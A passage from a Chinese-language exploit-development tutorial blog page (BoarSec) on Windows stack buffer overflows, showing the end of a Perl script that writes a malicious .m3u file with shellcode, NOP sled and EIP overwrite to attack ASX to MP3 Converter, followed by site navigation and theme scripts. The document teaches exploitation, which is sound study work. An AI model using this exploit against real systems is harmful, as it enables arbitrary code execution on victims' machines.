<span class="string">"\x1a\x6c\x46\x74\xdb\x0f\xce\x91\xea\x1d\xb4\xd2\x5f\x92"</span> .
<span class="string">"\xbe\xb6\x53\x59\x92\x22\xe7\x2f\x3b\x45\x40\x85\x1d\x68"</span> .
<span class="string">"\x51\x2b\xa2\x26\x91\x2d\x5e\x34\xc6\x8d\x5f\xf7\x1b\xcf"</span> .
<span class="string">"\x98\xe5\xd4\x9d\x71\x62\x46\x32\xf5\x36\x5b\x33\xd9\x3d"</span> .
<span class="string">"\xe3\x4b\x5c\x81\x90\xe1\x5f\xd1\x09\x7d\x17\xc9\x22\xd9"</span> .
<span class="string">"\x88\xe8\xe7\x39\xf4\xa3\x8c\x8a\x8e\x32\x45\xc3\x6f\x05"</span> .
<span class="string">"\xa9\x88\x51\xaa\x24\xd0\x96\x0c\xd7\xa7\xec\x6f\x6a\xb0"</span> .
<span class="string">"\x36\x12\xb0\x35\xab\xb4\x33\xed\x0f\x45\x97\x68\xdb\x49"</span> .
<span class="string">"\x5c\xfe\x83\x4d\x63\xd3\xbf\x69\xe8\xd2\x6f\xf8\xaa\xf0"</span> .
<span class="string">"\xab\xa1\x69\x98\xea\x0f\xdf\xa5\xed\xf7\x80\x03\x65\x15"</span> .
<span class="string">"\xd4\x32\x24\x73\x2b\xb6\x52\x3a\x2b\xc8\x5c\x6c\x44\xf9"</span> .
<span class="string">"\xd7\xe3\x13\x06\x32\x40\xeb\x4c\x1f\xe0\x64\x09\xf5\xb1"</span> .
<span class="string">"\xe8\xaa\x23\xf5\x14\x29\xc6\x85\xe2\x31\xa3\x80\xaf\xf5"</span> .
<span class="string">"\x5f\xf8\xa0\x93\x5f\xaf\xc1\xb1\x03\x2e\x52\x59\xea\xd5"</span> .
<span class="string">"\xd2\xf8\xf2"</span>;

my $sploit = $junk.$eip.$nops.$shell; <span class="comment"># sploit portion of buffer</span>
my $fill = <span class="string">"\x43"</span> x ($buffsize - (length($sploit))); <span class="comment"># filler for consistency</span>
my $buffer = $sploit.$fill; <span class="comment"># build final buffer</span>

<span class="comment"># write the exploit buffer to file</span>
my $file = <span class="string">"asx2mp3.m3u"</span>;
open(<span class="type">FILE</span>, <span class="string">"&gt;$file"</span>);
print <span class="type">FILE</span> $buffer;
close(<span class="type">FILE</span>);
print <span class="string">"Exploit file created ["</span> . $file . <span class="string">"]\n"</span>;
print <span class="string">"Buffer size: "</span> . length($buffer) . <span class="string">"\n"</span>; 
</code></pre><p> 最终产生的.m3u文件，然后用ASX to MP3 Converter来打开它，你将会看见：</p>
<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5d84cc801853cdb59b3d4e0dce16aba3.png" alt=""> </p>
<p>如果计算器没有运行，确认你打开的.m3u文件是在你的C盘根目录，并且你重命名为了asx2mp3.m3u。吉珠，这个Exp是一个离完美很远的挫玩意儿，因为文件路径影响了DLL的重定向等相关问题，我们将会在 Part3 中来继续讨论这个问题。</p>
<h2 id="结论">结论</h2><p>那就这样吧～</p>

        
      </div>
    

    
      <div class="post-footer">
        

        
          <div class="post-nav">
            <div class="post-nav-prev post-nav-item">
              
            </div>

            <div class="post-nav-next post-nav-item">
              
                <a href="/2015/03/19/windows-exp-dev-part1/">Windows Exploit Development —— 第一部分 基础</a>
              
            </div>
          </div>
        

        
        
      </div>
    
  </div>



  
    <div class="comments" id="comments">
      
    </div>
  

          </div>

          
        </div>

        
<div class="sidebar-toggle">
  <div class="sidebar-toggle-line-wrap">
    <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
    <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
    <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
  </div>
</div>

<div id="sidebar" class="sidebar">
  <div class="sidebar-inner">

    
      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
          文章目录
        </li>
        <li class="sidebar-nav-overview" data-target="site-overview">
          站点概览
        </li>
      </ul>
    

    <div class="site-overview">
      <div class="site-author motion-element">
        <img class="site-author-image" src="images/logo.png" alt="BoarSec" />
        <p class="site-author-name">BoarSec</p>
      </div>
      <p class="site-description motion-element">the boar infosec team</p>
      <div class="site-state motion-element">
        <div class="site-state-item site-state-posts">
          <span class="site-state-item-count">4</span>
          <span class="site-state-item-name">日志</span>
        </div>
        <div class="site-state-item site-state-tags">
            <span class="site-state-item-count">0</span>
            <span class="site-state-item-name">标签</span>
        </div>
        <div class="site-state-item site-state-pages">
            <span class="site-state-item-count">3</span>
            <span class="site-state-item-name">页面</span>
        </div>
      </div>

      

      <div class="social-info motion-element">
        
          
            <span class="social-item">
              <a href="https://github.com/BoarSec">github</a>
            </span>
          
        
      </div>

      
      
        <div class="cc-license motion-element">
          <a href="http://creativecommons.org/licenses/zero/4.0" class="cc-opacity" target="_blank">
            <img src="/images/cc-zero.svg" alt="Creative Commons" />
          </a>
        </div>
      

    </div>

    
      <div class="post-toc-wrap sidebar-panel-active">
        <div class="post-toc-indicator-top post-toc-indicator"></div>
        <div class="post-toc">
          <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows_漏洞利用程序开发之栈溢出"><span class="nav-number">1.</span> <span class="nav-text">Windows 漏洞利用程序开发之栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#关于栈缓冲区溢出"><span class="nav-number">1.1.</span> <span class="nav-text">关于栈缓冲区溢出</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找到有漏洞的程序"><span class="nav-number">1.2.</span> <span class="nav-text">找到有漏洞的程序</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现漏洞/崩溃"><span class="nav-number">1.3.</span> <span class="nav-text">复现漏洞/崩溃</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#控制EIP的覆盖（确定偏移地址）"><span class="nav-number">1.4.</span> <span class="nav-text">控制EIP的覆盖（确定偏移地址）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#定位ShellCode"><span class="nav-number">1.5.</span> <span class="nav-text">定位ShellCode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找到我们的ShellCode偏移"><span class="nav-number">1.6.</span> <span class="nav-text">找到我们的ShellCode偏移</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#暂停程序执行确定Shellcode偏移"><span class="nav-number">1.6.1.</span> <span class="nav-text">暂停程序执行确定Shellcode偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Msf的Pattern_offset-rb脚本"><span class="nav-number">1.6.2.</span> <span class="nav-text">使用Msf的Pattern_offset.rb脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Mona插件"><span class="nav-number">1.6.3.</span> <span class="nav-text">使用Mona插件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#构造ShellCode"><span class="nav-number">1.7.</span> <span class="nav-text">构造ShellCode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#整合到一块儿"><span class="nav-number">1.8.</span> <span class="nav-text">整合到一块儿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结论"><span class="nav-number">1.9.</span> <span class="nav-text">结论</span></a></li></ol></li></ol>
        </div>
        <div class="post-toc-indicator-bottom post-toc-indicator"></div>
      </div>
    

  </div>
</div>


      </div>
    </div>

    <div id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; &nbsp; 
  2015
  <span class="with-love">
    <i class="icon-heart"></i>
  </span>
  <span class="author">BoarSec</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 - <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT</a>
</div>



      </div>
    </div>

    <div class="back-to-top"></div>
  </div>

  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
  <script type="text/javascript">
    $(document).ready(function() {
      $(".fancybox").fancybox();
    });
  </script>

  <script type="text/javascript">
  function hasMobileUA () {
    var nav = window.navigator;
    var ua = nav.userAgent;
    var pa = /iPad|iPhone|Android|Opera Mini|BlackBerry|webOS|UCWEB|Blazer|PSP|IEMobile|Symbian/g;

    return pa.test(ua);
  }

  function isDesktop () {
    return screen.width > 991 && !hasMobileUA();
  }

  function isTablet () {
    return screen.width < 992 && screen.width > 767 && hasMobileUA();
  }

  function isMobile () {
    return screen.width < 767 && hasMobileUA();
  }

  function escapeSelector (selector) {
    return selector.replace(/[!"$%&'()*+,.\/:;<=>?@[\\\]^`{|}~]/g, "\\$&")
  }
</script>

  

  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>

  

  <script type="text/javascript" id="motion.global">
  $(document).ready(function () {
    var body = $('body');
    var isSidebarVisible = false;
    var sidebarToggle = $('.sidebar-toggle');
    var sidebarToggleLine1st = $('.sidebar-toggle-line-first')
    var sidebarToggleLine2nd = $('.sidebar-toggle-line-middle');
    var sidebarToggleLine3rd = $('.sidebar-toggle-line-last');
    var sidebar = $('.sidebar');

    var SIDEBAR_WIDTH = '320px';
    var SIDEBAR_DISPLAY_DURATION = 300;

    var sidebarToogleLineStatusInit = {width: '100%', opacity: 1, left: 0, rotateZ: 0, top: 0};

    var sidebarToggleLine1stStatusInit = sidebarToogleLineStatusInit;
    var sidebarToggleLine1stStatusArrow = {width: '50%', rotateZ: '-45deg', top: '2px'};
    var sidebarToogleLine1stStatusClose = {width: '100%', rotateZ: '-45deg', top: '5px'};

    var sidebarToggleLine2ndStatusInit = sidebarToogleLineStatusInit;
    var sidebarToggleLine2ndStatusArrow = {width: '90%'};
    var sidebarToogleLine2ndStatusClose = {opacity: 0};

    var sidebarToggleLine3rdStatusInit = sidebarToogleLineStatusInit;
    var sidebarToggleLine3rdStatusArrow = {width: '50%', rotateZ: '45deg', top: '-2px'};
    var sidebarToogleLine3rdStatusClose = {width: '100%', rotateZ: '45deg', top: '-5px'};

    sidebatToggleMotion();
    postsListMotion();
    backToTopMotion();


    $(document)
      .on('sidebar.isShowing', function () {
        isDesktop() && body.velocity(
          {paddingRight: SIDEBAR_WIDTH},
          SIDEBAR_DISPLAY_DURATION
        );
        sidebarContentMotion();
      })
      .on('sidebar.isHiding', function () {});


    function backToTopMotion () {
      var b2top = $('.back-to-top');
      b2top.on('click', function () {
        body.velocity('scroll');
      });
    }

    function sidebarShowMotion () {

      sidebarToggleLine1st.velocity(sidebarToogleLine1stStatusClose);
      sidebarToggleLine2nd.velocity(sidebarToogleLine2ndStatusClose);
      sidebarToggleLine3rd.velocity(sidebarToogleLine3rdStatusClose);

      sidebar.velocity({width: SIDEBAR_WIDTH}, {
        display: 'block',
        duration: SIDEBAR_DISPLAY_DURATION,
        complete: function () {
          sidebar.addClass('sidebar-active');
          sidebar.trigger('sidebar.didShow');
        }
      });
      sidebar.trigger('sidebar.isShowing');
    }

    function sidebarHideMotion () {
      isDesktop() && body.velocity({paddingRight: 0});
      sidebar.velocity('reverse');

      sidebarToggleLine1st.velocity(sidebarToggleLine1stStatusInit);
      sidebarToggleLine2nd.velocity(sidebarToggleLine2ndStatusInit);
      sidebarToggleLine3rd.velocity(sidebarToggleLine3rdStatusInit);

      sidebar.removeClass('sidebar-active');
      sidebar.trigger('sidebar.isHiding');
    };

    function sidebarContentMotion () {
      $('.sidebar .motion-element').velocity(
        'transition.slideRightIn',
        {stagger: 50, drag: true}
      );
    }

    function postsListMotion () {
      var postMotionOptions = postMotionOptions || {stagger: 300, drag: true};
      $('.post').velocity('transition.slideDownIn', postMotionOptions);
    }

    function sidebatToggleMotion () {
      sidebarToggle.on('click', function () {
        isSidebarVisible ? sidebarHideMotion() : sidebarShowMotion();
        isSidebarVisible = !isSidebarVisible;
      });

      sidebarToggle.hover(function () {
        if (isSidebarVisible) {return}
        sidebarToggleLine1st.velocity('stop').velocity(sidebarToggleLine1stStatusArrow);
        sidebarToggleLine2nd.velocity('stop').velocity(sidebarToggleLine2ndStatusArrow);
        sidebarToggleLine3rd.velocity('stop').velocity(sidebarToggleLine3rdStatusArrow);
      }, function () {
        if (isSidebarVisible) {return}
        sidebarToggleLine1st.velocity('stop').velocity(sidebarToggleLine1stStatusInit);
        sidebarToggleLine2nd.velocity('stop').velocity(sidebarToggleLine2ndStatusInit);
        sidebarToggleLine3rd.velocity('stop').velocity(sidebarToggleLine3rdStatusInit);
      });
    }
  });

</script>





  
  
<script type="text/javascript" id="bootstrap.scrollspy.custom">
  /* ========================================================================
  * Bootstrap: scrollspy.js v3.3.2
  * http://getbootstrap.com/javascript/#scrollspy
  * ========================================================================
  * Copyright 2011-2015 Twitter, Inc.
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
  * ======================================================================== */

  /**
   * Custom by iissnan
   *
   * - Add a `clear.bs.scrollspy` event.
   * - Esacpe targets selector.
   */


  +function ($) {
    'use strict';

    // SCROLLSPY CLASS DEFINITION
    // ==========================

    function ScrollSpy(element, options) {
      this.$body          = $(document.body)
      this.$scrollElement = $(element).is(document.body) ? $(window) : $(element)
      this.options        = $.extend({}, ScrollSpy.DEFAULTS, options)
      this.selector       = (this.options.target || '') + ' .nav li > a'
      this.offsets        = []
      this.targets        = []
      this.activeTarget   = null
      this.scrollHeight   = 0

      this.$scrollElement.on('scroll.bs.scrollspy', $.proxy(this.process, this))
      this.refresh()
      this.process()
    }

    ScrollSpy.VERSION  = '3.3.2'

    ScrollSpy.DEFAULTS = {
      offset: 10
    }

    ScrollSpy.prototype.getScrollHeight = function () {
      return this.$scrollElement[0].scrollHeight || Math.max(this.$body[0].scrollHeight, document.documentElement.scrollHeight)
    }

    ScrollSpy.prototype.refresh = function () {
      var that          = this
      var offsetMethod  = 'offset'
      var offsetBase    = 0

      this.offsets      = []
      this.targets      = []
      this.scrollHeight = this.getScrollHeight()

      if (!$.isWindow(this.$scrollElement[0])) {
        offsetMethod = 'position'
        offsetBase   = this.$scrollElement.scrollTop()
      }

      this.$body
        .find(this.selector)
        .map(function () {
          var $el   = $(this)
          var href  = $el.data('target') || $el.attr('href')
          var $href = /^#./.test(href) && $(escapeSelector(href)) // Need to escape selector.

          return ($href
            && $href.length
            && $href.is(':visible')
            && [[$href[offsetMethod]().top + offsetBase, href]]) || null
        })
        .sort(function (a, b) { return a[0] - b[0] })
        .each(function () {
          that.offsets.push(this[0])
          that.targets.push(this[1])
        })


    }

    ScrollSpy.prototype.process = function () {
      var scrollTop    = this.$scrollElement.scrollTop() + this.options.offset
      var scrollHeight = this.getScrollHeight()
      var maxScroll    = this.options.offset + scrollHeight - this.$scrollElement.height()
      var offsets      = this.offsets
      var targets      = this.targets
      var activeTarget = this.activeTarget
      var i

      if (this.scrollHeight != scrollHeight) {
        this.refresh()
      }

      if (scrollTop >= maxScroll) {
        return activeTarget != (i = targets[targets.length - 1]) && this.activate(i)
      }

      if (activeTarget && scrollTop < offsets[0]) {
        $(this.selector).trigger('clear.bs.scrollspy')  // Add a custom event.
        this.activeTarget = null
        return this.clear()
      }

      for (i = offsets.length; i--;) {
        activeTarget != targets[i]
          && scrollTop >= offsets[i]
          && (!offsets[i + 1] || scrollTop <= offsets[i + 1])
          && this.activate(targets[i])
      }
    }

    ScrollSpy.prototype.activate = function (target) {
      this.activeTarget = target

      this.clear()

      var selector = this.selector +
        '[data-target="' + target + '"],' +
        this.selector + '[href="' + target + '"]'

      var active = $(selector)
        .parents('li')
        .addClass('active')

      if (active.parent('.dropdown-menu').length) {
        active = active
          .closest('li.dropdown')
          .addClass('active')
      }

      active.trigger('activate.bs.scrollspy')
    }

    ScrollSpy.prototype.clear = function () {
      $(this.selector)
        .parentsUntil(this.options.target, '.active')
        .removeClass('active')
    }


    // SCROLLSPY PLUGIN DEFINITION
    // ===========================

    function Plugin(option) {
      return this.each(function () {
        var $this   = $(this)
        var data    = $this.data('bs.scrollspy')
        var options = typeof option == 'object' && option

        if (!data) $this.data('bs.scrollspy', (data = new ScrollSpy(this, options)))
        if (typeof option == 'string') data[option]()
      })
    }

    var old = $.fn.scrollspy

    $.fn.scrollspy             = Plugin
    $.fn.scrollspy.Constructor = ScrollSpy


    // SCROLLSPY NO CONFLICT
    // =====================

    $.fn.scrollspy.noConflict = function () {
      $.fn.scrollspy = old
      return this
    }


    // SCROLLSPY DATA-API
    // ==================

    $(window).on('load.bs.scrollspy.data-api', function () {
      $('[data-spy="scroll"]').each(function () {
        var $spy = $(this)
        Plugin.call($spy, $spy.data())
      })
    })

  }(jQuery);
</script>


<script type="text/javascript" id="sidebar.toc.highlight">
  $(document).ready(function () {
    var tocSelector = '.post-toc';
    var $tocSelector = $(tocSelector);
    var activeCurrentSelector = '.active-current';

    $tocSelector
      .on('activate.bs.scrollspy', function () {
        var $currentActiveElement = $(tocSelector + ' .active').last();

        removeCurrentActiveClass();
        $currentActiveElement.addClass('active-current');

        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
      })
      .on('clear.bs.scrollspy', function () {
        removeCurrentActiveClass();
      });

    function removeCurrentActiveClass () {
      $(tocSelector + ' ' + activeCurrentSelector)
        .removeClass(activeCurrentSelector.substring(1));
    }

    function processTOC () {
      getTOCMaxHeight();
      toggleTOCOverflowIndicators();
    }

    function getTOCMaxHeight () {
      var $sidebarInner = $('.sidebar-inner');
      var height = $('.sidebar').height() -
                   $tocSelector.position().top -
                   $('.post-toc-indicator-bottom').height();

      $tocSelector.css('height', height);

      return height;
    }

    function toggleTOCOverflowIndicators () {
      tocOverflowIndicator(
        '.post-toc-indicator-top',
        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
      );

      tocOverflowIndicator(
        '.post-toc-indicator-bottom',
        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
      )
    }

    $(document).on('sidebar.didShow', function () {
      processTOC();
    });

    $('body').scrollspy({ target: tocSelector });
    $(window).on('resize', function () {
      if ( $('.sidebar').hasClass('sidebar-active') ) {
        processTOC();
      }
    });

    onScroll($tocSelector);

    function onScroll (element) {
      element.on('mousewheel DOMMouseScroll', function (event) {
          var oe = event.originalEvent;
          var delta = oe.wheelDelta || -oe.detail;
          var self = this;

          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
          event.preventDefault();

          toggleTOCOverflowIndicators();
      });
    }

    function tocOverflowIndicator (indicator, action) {
      $(indicator).velocity('stop').velocity({
        opacity: action === 'show' ? 0.4 : 0
      }, { duration: 100 });
    }

  });
</script>


  <script type="text/javascript" id="sidebar.nav">
    $(document).ready(function () {
      var html = $('html');

      $('.sidebar-nav li').on('click', function () {
        var item = $(this);
        var activeTabClassName = 'sidebar-nav-active';
        var activePanelClassName = 'sidebar-panel-active';
        if (item.hasClass(activeTabClassName)) {
          return;
        }

        var currentTarget = $('.' + activePanelClassName);
        var target = $('.' + item.data('target'));

        currentTarget.velocity('transition.slideUpOut', 200, function () {
          target
            .velocity('stop')
            .velocity('transition.slideDownIn', 200)
            .addClass(activePanelClassName);
        });

        item.siblings().removeClass(activeTabClassName);
        item.addClass(activeTabClassName);
      });

      $('.post-toc a').on('click', function (e) {
        e.preventDefault();
        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
        html.velocity('stop').velocity('scroll', {
          offset: offset  + 'px',
          mobileHA: false
        });
      });

      // Expand sidebar on post detail page by default, when post has a toc.
      if ($('.post-toc').html().trim().length > 0 && isDesktop()) {
        setTimeout(function () {
          $('.sidebar-toggle').trigger('click');
        }, 800);
      }
    });
  </script>




  

  
  

  


  
</body>
</html>
